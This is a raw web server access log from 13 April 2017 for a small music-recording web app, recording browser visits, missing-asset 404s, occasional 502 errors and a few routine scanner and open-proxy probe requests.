132.205.228.203 - - [13/Apr/2017:06:00:52 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.228.203 - - [13/Apr/2017:06:00:53 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.228.203 - - [13/Apr/2017:06:00:53 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.228.203 - - [13/Apr/2017:06:01:19 +0000] "GET / HTTP/1.1" 200 1315 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
132.205.228.203 - - [13/Apr/2017:06:01:19 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
132.205.228.203 - - [13/Apr/2017:06:01:19 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
132.205.228.203 - - [13/Apr/2017:06:01:19 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
132.205.228.203 - - [13/Apr/2017:06:01:20 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
132.205.228.203 - - [13/Apr/2017:06:01:40 +0000] "GET / HTTP/1.1" 200 1315 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
132.205.228.203 - - [13/Apr/2017:06:01:40 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
132.205.228.203 - - [13/Apr/2017:06:01:41 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
132.205.228.203 - - [13/Apr/2017:06:01:41 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
132.205.228.203 - - [13/Apr/2017:06:01:41 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
24.114.71.94 - - [13/Apr/2017:06:02:07 +0000] "GET / HTTP/1.1" 200 1315 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:02:08 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:02:08 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:02:08 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:04:56 +0000] "GET / HTTP/1.1" 200 1316 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:04:56 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:04:56 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:04:56 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:06:01 +0000] "GET / HTTP/1.1" 200 1316 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.71.94 - - [13/Apr/2017:06:06:01 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.71.94 - - [13/Apr/2017:06:06:01 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.71.94 - - [13/Apr/2017:06:06:01 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.71.94 - - [13/Apr/2017:06:24:31 +0000] "GET / HTTP/1.1" 200 1316 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:24:31 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:24:31 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:24:31 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:44:54 +0000] "GET / HTTP/1.1" 200 1329 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:44:54 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:44:54 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:44:54 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:44:54 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:47:58 +0000] "GET / HTTP/1.1" 200 1329 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:47:58 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:47:58 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:47:58 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:49:33 +0000] "GET / HTTP/1.1" 200 1329 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:49:33 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:49:33 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:49:33 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:49:33 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:50:49 +0000] "GET / HTTP/1.1" 200 1329 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:50:49 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:50:49 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:50:49 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:53:21 +0000] "GET / HTTP/1.1" 200 1329 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:53:22 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:53:22 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:53:22 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:55:41 +0000] "GET / HTTP/1.1" 200 1329 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:55:41 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:55:41 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:55:41 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:55:41 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:59:34 +0000] "GET / HTTP/1.1" 200 1331 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:59:34 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:59:34 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:06:59:34 +0000] "GET /recordmp3.js HTTP/1.1" 404 1011 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:07:08:38 +0000] "GET / HTTP/1.1" 200 1366 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:07:08:38 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:07:08:38 +0000] "GET /jquery-1.11.0.min.js HTTP/1.1" 404 1019 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:07:09:51 +0000] "GET / HTTP/1.1" 200 1349 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:07:09:51 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:07:13:10 +0000] "GET / HTTP/1.1" 200 1349 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.71.94 - - [13/Apr/2017:07:13:10 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.71.94 - - [13/Apr/2017:07:13:11 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.71.94 - - [13/Apr/2017:07:13:42 +0000] "GET /css/style.css HTTP/1.1" 404 1006 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
118.167.43.62 - - [13/Apr/2017:07:19:23 +0000] "GET / HTTP/1.1" 200 5557 "http://35.163.12.69:81" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
24.114.71.94 - - [13/Apr/2017:07:28:27 +0000] "GET / HTTP/1.1" 200 1349 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.71.94 - - [13/Apr/2017:07:28:27 +0000] "GET /css/style.css HTTP/1.1" 404 1007 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.71.94 - - [13/Apr/2017:07:29:53 +0000] "GET / HTTP/1.1" 200 1349 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.71.94 - - [13/Apr/2017:07:29:54 +0000] "GET /css/style.css HTTP/1.1" 404 1007 "http://35.163.12.69/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.71.94 - - [13/Apr/2017:07:31:25 +0000] "GET / HTTP/1.1" 200 1349 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.71.94 - - [13/Apr/2017:07:31:26 +0000] "GET /css/style.css HTTP/1.1" 404 1007 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
132.205.229.69 - - [13/Apr/2017:07:32:41 +0000] "GET / HTTP/1.1" 200 1349 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.69 - - [13/Apr/2017:07:32:41 +0000] "GET /css/style.css HTTP/1.1" 404 1007 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
24.114.80.245 - - [13/Apr/2017:07:33:56 +0000] "GET / HTTP/1.1" 200 1349 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
24.114.80.245 - - [13/Apr/2017:07:33:56 +0000] "GET /css/style.css HTTP/1.1" 404 1007 "http://35.163.12.69/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
201.114.5.117 - - [13/Apr/2017:07:40:55 +0000] "GET / HTTP/1.0" 200 5538 "-" "-"
24.114.58.21 - - [13/Apr/2017:07:54:09 +0000] "GET / HTTP/1.1" 200 1365 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:07:54:09 +0000] "GET /css/style.css HTTP/1.1" 404 1007 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:08:18:04 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:08:18:24 +0000] "GET / HTTP/1.1" 200 2072 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:08:18:24 +0000] "GET /js/jquery-1.11.0.min.js HTTP/1.1" 404 1023 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:08:18:24 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:08:19:14 +0000] "GET / HTTP/1.1" 200 2056 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:08:19:14 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:08:33:31 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:08:33:40 +0000] "GET / HTTP/1.1" 200 3688 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:08:35:37 +0000] "GET / HTTP/1.1" 200 3688 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36"
24.114.58.21 - - [13/Apr/2017:08:36:17 +0000] "GET / HTTP/1.1" 200 3688 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:08:45:29 +0000] "GET / HTTP/1.1" 200 2746 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
71.6.146.185 - - [13/Apr/2017:08:49:16 +0000] "myversion|3.6 Public" 400 181 "-" "-"
61.164.149.128 - - [13/Apr/2017:08:50:26 +0000] "GET http://www.server110.com/ HTTP/1.1" 200 5557 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)"
61.164.149.128 - - [13/Apr/2017:08:50:28 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
61.164.149.128 - - [13/Apr/2017:08:50:29 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
61.164.149.128 - - [13/Apr/2017:08:50:30 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
24.114.58.21 - - [13/Apr/2017:08:51:38 +0000] "GET / HTTP/1.1" 200 2811 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:04:53 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:05:02 +0000] "GET / HTTP/1.1" 200 2898 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:06:05 +0000] "GET / HTTP/1.1" 200 2885 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:14:02 +0000] "GET / HTTP/1.1" 200 2411 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:16:19 +0000] "GET / HTTP/1.1" 200 2333 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:16:44 +0000] "GET / HTTP/1.1" 200 2333 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:18:03 +0000] "GET / HTTP/1.1" 200 2357 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:18:19 +0000] "GET / HTTP/1.1" 200 2357 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:19:44 +0000] "GET / HTTP/1.1" 200 2411 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:20:35 +0000] "GET / HTTP/1.1" 200 2390 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:21:54 +0000] "GET / HTTP/1.1" 200 2381 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:23:31 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:28:23 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:28:23 +0000] "GET /favicon.ico HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:28:32 +0000] "GET / HTTP/1.1" 200 2381 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:31:31 +0000] "POST /result HTTP/1.1" 200 77 "-" "curl/7.47.0"
24.114.58.21 - - [13/Apr/2017:09:33:50 +0000] "GET / HTTP/1.1" 200 2374 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:38:29 +0000] "GET / HTTP/1.1" 200 2132 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:43:42 +0000] "GET / HTTP/1.1" 200 2006 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:49:31 +0000] "GET / HTTP/1.1" 200 1960 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:50:22 +0000] "GET / HTTP/1.1" 200 1939 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:51:34 +0000] "GET / HTTP/1.1" 200 1944 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:51:45 +0000] "GET / HTTP/1.1" 200 1944 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:56:34 +0000] "GET / HTTP/1.1" 200 1586 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:57:20 +0000] "GET / HTTP/1.1" 200 1589 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:09:57:25 +0000] "GET / HTTP/1.1" 200 1589 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
